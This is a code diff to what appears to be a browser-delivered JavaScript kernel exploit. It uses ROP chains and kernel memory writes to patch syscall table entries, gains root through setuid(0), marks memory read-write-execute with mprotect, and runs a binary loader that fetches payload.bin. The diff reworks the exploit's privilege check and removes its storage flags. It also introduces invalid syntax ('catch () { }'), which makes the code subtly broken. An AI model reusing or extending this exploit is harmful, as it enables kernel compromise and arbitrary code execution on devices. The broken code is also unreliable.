@@ -142,6 +142,10 @@ const num_clobbers = 8;
 let chain = null;
 var nogc = [];
 
+const PROT_READ = 1;
+const PROT_WRITE = 2;
+const PROT_EXEC = 4;
+
 async function init() {
     await rop.init();
     chain = new Chain();
@@ -1603,8 +1607,6 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     kmem.write64(sysent_661.add(8), sy_call);
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
-    localStorage.ExploitLoaded="yes"
-    sessionStorage.ExploitLoaded="yes";
    //alert("kernel exploit succeeded!");
 }
 
@@ -1665,7 +1667,7 @@ function runBinLoader() {
     BLDR[57] = 0x48C3050F; BLDR[58] = 0x006AC0C7; BLDR[59] = 0x89490000;
     BLDR[60] = 0xC3050FCA;
 
-    chain.sys('mprotect', payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
+    chain.sys('mprotect', payload_loader, 0x4000, (PROT_READ | PROT_WRITE | PROT_EXEC));
 
     var pthread = malloc(0x10);
     sysi('mlock', payload_buffer, 0x300000);
@@ -1698,17 +1700,13 @@ export async function kexploit() {
     const _init_t2 = performance.now();
 
      try {
-        chain.sys('setuid', 0);
+         if (sysi("setuid", 0) == 0) {
+             runBinLoader();
+             return new Promise(() => {});  
+          }
         }
-    catch (e) {
-        localStorage.ExploitLoaded = "no";
-    }
+    catch () { }
     
-     if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded!="yes") {
-           runBinLoader();
-            return new Promise(() => {});
-      }
- 
     // fun fact:
     // if the first thing you do since boot is run the web browser, WebKit can
     // use all the cores
@@ -1811,11 +1809,6 @@ function array_from_address(addr, size) {
 }
 
 kexploit().then(() => {
-
-
-const PROT_READ = 1;
-const PROT_WRITE = 2;
-const PROT_EXEC = 4;
 
 fetch('./payload.bin').then(res => res.arrayBuffer()).then(arr => {
    
